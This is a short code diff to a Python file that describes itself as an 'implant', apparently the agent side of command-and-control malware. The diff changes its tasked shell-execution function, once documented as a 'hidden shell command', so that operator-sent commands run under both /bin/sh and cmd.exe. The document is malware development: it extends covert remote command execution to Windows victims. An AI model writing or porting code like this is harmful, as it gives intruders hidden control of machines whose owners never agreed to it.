@@ -511,10 +511,12 @@ def http_get(url, ua, pin="", auth=""):
 
 
 def run_task_exec(cmd):
-    """Hidden shell command for tasked exec; output capped at 4 MB."""
+    """Tasked shell command; output capped at 4 MB.
+    shell=True picks /bin/sh on POSIX and cmd.exe on Windows, so the same
+    implant file handles tasked exec correctly on either platform."""
     import subprocess
     try:
-        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=60)
+        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
         out = (r.stdout or b"") + ((b"\n[stderr]\n" + r.stderr) if r.stderr else b"")
         return out[:4 * 1024 * 1024]
     except Exception as e:
